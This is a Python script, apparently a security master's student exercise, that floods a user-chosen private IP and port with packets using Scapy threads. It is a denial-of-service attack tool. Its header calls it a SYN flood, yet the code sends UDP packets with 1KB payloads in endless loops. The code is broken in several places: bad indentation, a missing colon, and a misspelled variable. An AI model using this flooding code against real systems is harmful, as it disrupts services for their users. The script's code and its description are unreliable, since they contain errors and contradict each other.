# Paulo Abade - 23919
# Mestrado de Engenharia de Segurança Informática
# Iniciado em 20/10/2025
# Última atualização: 29/10/2025

# Faz um ataque de SYN Flood a um IP e a uma porta que tenham sido especificados pelo utilizador
# Foi seguido o tutorial de: https://github.com/M-Taghizadeh/PyDOS, onde foi misturado com os contéudos de
# https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python

import sys 
import threading
from scapy.all import *
import ipaddress


def dos_attack():
    print("DoS Attack")

     # Validar o endereço IP
    is_an_ip = False
    while not is_an_ip:
        target_ip = input("Insira um IP dentro da sua rede privada (ex: 192.168.1.254): \n")
        try:
            ip_obj = ipaddress.ip_address(target_ip)
            # Verifica se é um IP privado
            if ip_obj.is_private:
                is_an_ip = True
            else:
                print("Erro: Insira um IP privado (192.168.x.x, 10.x.x.x, 172.16-31.x.x).\n")
        except ValueError:
            print("Erro: Formato de IP inválido.\n")

    # Validar o número da porta
    isnumber1 = False
    while not isnumber1:
        try:
            target_port = int(input("Insira uma porta válida entre 0 e 65535 (ex: 80, 443, etc...): \n"))
            if 1 <= target_port <= 65535:
                isnumber1 = True
            else:
                print("Erro: A porta deve estar entre 1 e 65535.\n")
        except ValueError:
        print("Erro: Insira apenas números inteiros.\n")

    isnumber2 = False
    while not isnumber2:
        try:
            n_threads = int(input("Insira o número de threads que irão atacar o alvo: \n"))
            if n_threads > 0
                isnumber2 = True
            else:
                print("Erro: O número deve ser maior que 0.\n")
        except ValueError:
        print("Erro: Insira apenas números inteiros.\n")
  
    # É informado qual o endereço de destino
    ip = IP(dst=target_ip)

    # É informado qual a porta de origem aleatoriamente e a porta de destino escolhida pelo utilizador.
    udp = UDP(sport=RandShort(), dport=targer_port)

    # É adicionado contéudo para inundar e travar a vítima. Neste caso 1KB
    raw = Raw(b"X"*1024)
    #  Cria o pacote que será enviado
    p = ip / udp / raw

    for _ in range(n_threads):
        try:
            threading.Thread(target=dos, args=(p,)).start()
        except KeyboardInterrupt:
		    sys.exit(0)

    
def dos(p):
    while True:
        # Envia o pacote para a 4ª camada. Só para quando o utilizador apertar CTRL+C
        send(p, loop = 1, verbose = 0)
